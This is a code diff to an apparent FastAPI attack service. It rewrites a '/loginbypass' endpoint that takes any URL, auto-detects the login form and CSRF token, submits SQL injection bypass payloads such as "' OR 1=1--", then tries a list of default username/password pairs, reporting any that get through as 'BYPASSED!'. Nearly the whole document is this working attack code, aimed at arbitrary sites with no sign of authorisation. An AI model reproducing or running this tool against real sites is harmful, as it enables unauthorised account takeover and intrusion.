@@ -1414,85 +1414,157 @@ def aggressive_attack(domain: str, key: str = Depends(verify_key)):
 
 @app.get("/loginbypass")
 def login_bypass(url: str, key: str = Depends(verify_key)):
-    import urllib.request, urllib.parse, urllib.error
+    import requests as req_lib
+    from bs4 import BeautifulSoup
     start = time.time()
     if not url.startswith("http"):
         url = "https://" + url
     
     results = []
+    session = req_lib.Session()
+    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
     
-    # 1. SQL Injection login bypass
-    sql_payloads = [
-        {"user": "' OR 1=1--", "pass": "anything"},
-        {"user": "admin'--", "pass": "anything"},
-        {"user": "' OR 'x'='x", "pass": "' OR 'x'='x"},
-        {"user": "admin' #", "pass": "anything"},
-        {"user": "') OR ('1'='1", "pass": "anything"},
-    ]
+    # Step 1 - Page fetch karke form analyze karo
+    try:
+        res = session.get(url, timeout=10, allow_redirects=True)
+        soup = BeautifulSoup(res.text, "html.parser")
+        
+        # Form fields auto detect
+        forms = soup.find_all("form")
+        form_info = []
+        for form in forms:
+            inputs = form.find_all("input")
+            fields = {inp.get("name",""): inp.get("value","") for inp in inputs if inp.get("name")}
+            action = form.get("action", url)
+            method = form.get("method", "post").lower()
+            if any(k in str(fields).lower() for k in ["user","email","login","pass","pwd"]):
+                form_info.append({"action": action, "method": method, "fields": fields})
+        
+        if not form_info:
+            return {"url": url, "status": "No login form found", "response_time": f"{round(time.time()-start, 2)}s"}
+        
+        # CSRF token detect
+        csrf_token = ""
+        csrf_names = ["csrf_token", "csrf", "_token", "authenticity_token", "__RequestVerificationToken"]
+        for form in forms:
+            for csrf_name in csrf_names:
+                token_input = form.find("input", {"name": csrf_name})
+                if token_input:
+                    csrf_token = token_input.get("value", "")
+                    break
+        
+        form = form_info[0]
+        action_url = form["action"]
+        if not action_url.startswith("http"):
+            base = "/".join(url.split("/")[:3])
+            action_url = base + ("/" if not form["action"].startswith("/") else "") + form["action"]
+        
+        original_url = res.url
+        
+        # Step 2 - SQL Injection payloads
+        sql_payloads = [
+            ("' OR 1=1--", "x"),
+            ("admin'--", "anything"),
+            ("' OR 'x'='x", "' OR 'x'='x"),
+            ("admin' #", "x"),
+            ("') OR ('1'='1", "x"),
+        ]
+        
+        user_fields = [k for k in form["fields"] if any(x in k.lower() for x in ["user","email","login","name"])]
+        pass_fields = [k for k in form["fields"] if any(x in k.lower() for x in ["pass","pwd","password","secret"])]
+        
+        if not user_fields:
+            user_fields = list(form["fields"].keys())[:1]
+        if not pass_fields:
+            pass_fields = list(form["fields"].keys())[1:2]
+        
+        for sql_user, sql_pass in sql_payloads:
+            try:
+                data = dict(form["fields"])
+                if csrf_token:
+                    for cn in csrf_names:
+                        if cn in data:
+                            data[cn] = csrf_token
+                if user_fields:
+                    data[user_fields[0]] = sql_user
+                if pass_fields:
+                    data[pass_fields[0]] = sql_pass
+                
+                resp = session.post(action_url, data=data, timeout=8, allow_redirects=True)
+                
+                # Intelligent response check
+                url_changed = resp.url != original_url
+                has_logout = "logout" in resp.text.lower() or "sign out" in resp.text.lower()
+                has_dashboard = any(x in resp.text.lower() for x in ["dashboard","welcome","profile","account","my account"])
+                no_error = not any(x in resp.text.lower() for x in ["invalid","wrong","incorrect","failed","error","try again"])
+                
+                if (url_changed or has_logout or has_dashboard) and no_error:
+                    results.append({"type": "SQL Injection Bypass", "payload": sql_user, "status": "BYPASSED!", "severity": "CRITICAL", "redirect_to": resp.url})
+                else:
+                    results.append({"type": "SQL Injection", "payload": sql_user[:30], "status": "Failed"})
+            except Exception as e:
+                results.append({"type": "SQL Injection", "payload": sql_user[:30], "status": f"Error: {str(e)[:40]}"})
+        
+        # Step 3 - Default credentials
+        default_creds = [
+            ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
+            ("admin", "admin123"), ("admin", "1234"), ("root", "root"),
+            ("test", "test"), ("guest", "guest"), ("user", "user"),
+            ("administrator", "administrator"), ("admin", ""), ("admin", "pass"),
+        ]
+        
+        for username, password in default_creds:
+            try:
+                # Fresh session for each attempt
+                fresh = req_lib.Session()
+                fresh.headers.update({"User-Agent": "Mozilla/5.0"})
+                fresh_res = fresh.get(url, timeout=5)
+                fresh_soup = BeautifulSoup(fresh_res.text, "html.parser")
+                
+                data = dict(form["fields"])
+                
+                # Fresh CSRF token
+                for cn in csrf_names:
+                    token_inp = fresh_soup.find("input", {"name": cn})
+                    if token_inp:
+                        data[cn] = token_inp.get("value", "")
+                
+                if user_fields:
+                    data[user_fields[0]] = username
+                if pass_fields:
+                    data[pass_fields[0]] = password
+                
+                resp = fresh.post(action_url, data=data, timeout=8, allow_redirects=True)
+                
+                url_changed = resp.url != original_url
+                has_logout = "logout" in resp.text.lower() or "sign out" in resp.text.lower()
+                has_dashboard = any(x in resp.text.lower() for x in ["dashboard","welcome","profile","account","my account"])
+                no_error = not any(x in resp.text.lower() for x in ["invalid","wrong","incorrect","failed","error","try again"])
+                
+                if (url_changed or has_logout or has_dashboard) and no_error:
+                    results.append({"type": "Default Credentials", "username": username, "password": password, "status": "BYPASSED!", "severity": "CRITICAL", "redirect_to": resp.url})
+                else:
+                    results.append({"type": "Default Creds", "username": username, "password": password, "status": "Failed"})
+            except Exception as e:
+                results.append({"type": "Default Creds", "username": username, "status": f"Error: {str(e)[:40]}"})
+        
+    except Exception as e:
+        return {"url": url, "error": str(e), "response_time": f"{round(time.time()-start, 2)}s"}
     
-    for payload in sql_payloads:
-        try:
-            data = urllib.parse.urlencode({
-                "username": payload["user"],
-                "password": payload["pass"],
-                "user": payload["user"],
-                "pass": payload["pass"],
-                "email": payload["user"]
-            }).encode()
-            req = urllib.request.Request(url, data=data, headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"})
-            res = urllib.request.urlopen(req, timeout=5)
-            body = res.read(3000).decode("utf-8", errors="ignore").lower()
-            success_signs = ["welcome", "dashboard", "logout", "profile", "account", "success", "logged in"]
-            fail_signs = ["invalid", "wrong", "incorrect", "failed", "error"]
-            if any(s in body for s in success_signs) and not any(f in body for f in fail_signs):
-                results.append({"type": "SQL Injection", "payload": payload["user"], "status": "BYPASSED!", "severity": "CRITICAL"})
-            else:
-                results.append({"type": "SQL Injection", "payload": payload["user"][:30], "status": "Failed"})
-        except Exception as e:
-            results.append({"type": "SQL Injection", "payload": payload["user"][:30], "status": f"Error: {str(e)[:50]}"})
+    bypassed = [r for r in results if "BYPASSED" in str(r.get("status",""))]
     
-    # 2. Default credentials
-    default_creds = [
-        {"user": "admin", "pass": "admin"},
-        {"user": "admin", "pass": "password"},
-        {"user": "admin", "pass": "123456"},
-        {"user": "admin", "pass": "admin123"},
-        {"user": "root", "pass": "root"},
-        {"user": "test", "pass": "test"},
-        {"user": "guest", "pass": "guest"},
-        {"user": "user", "pass": "user"},
-        {"user": "administrator", "pass": "administrator"},
-        {"user": "admin", "pass": ""},
-    ]
-    
-    for cred in default_creds:
-        try:
-            data = urllib.parse.urlencode({
-                "username": cred["user"],
-                "password": cred["pass"],
-                "user": cred["user"],
-                "pass": cred["pass"],
-                "email": cred["user"]
-            }).encode()
-            req = urllib.request.Request(url, data=data, headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"})
-            res = urllib.request.urlopen(req, timeout=5)
-            body = res.read(3000).decode("utf-8", errors="ignore").lower()
-            success_signs = ["welcome", "dashboard", "logout", "profile", "account", "success", "logged in"]
-            fail_signs = ["invalid", "wrong", "incorrect", "failed", "error"]
-            if any(s in body for s in success_signs) and not any(f in body for f in fail_signs):
-                results.append({"type": "Default Creds", "username": cred["user"], "password": cred["pass"], "status": "BYPASSED!", "severity": "CRITICAL"})
-            else:
-                results.append({"type": "Default Creds", "username": cred["user"], "password": cred["pass"], "status": "Failed"})
-        except Exception as e:
-            results.append({"type": "Default Creds", "username": cred["user"], "status": f"Error: {str(e)[:40]}"})
-    
-    bypassed = [r for r in results if "BYPASSED" in r["status"]]
     return {
         "url": url,
+        "form_detected": len(form_info) > 0,
+        "csrf_token_found": bool(csrf_token),
+        "fields_detected": {"username_field": user_fields, "password_field": pass_fields},
         "total_tests": len(results),
         "bypassed_count": len(bypassed),
         "bypassed": bypassed,
         "all_results": results,
-        "verdict": "VULNERABLE! Login can be bypassed!" if bypassed else "Safe - No bypass found",
+        "verdict": "VULNERABLE! Login bypassed!" if bypassed else "Safe - No bypass found",
         "response_time": f"{round(time.time()-start, 2)}s"
     }
+
+
+
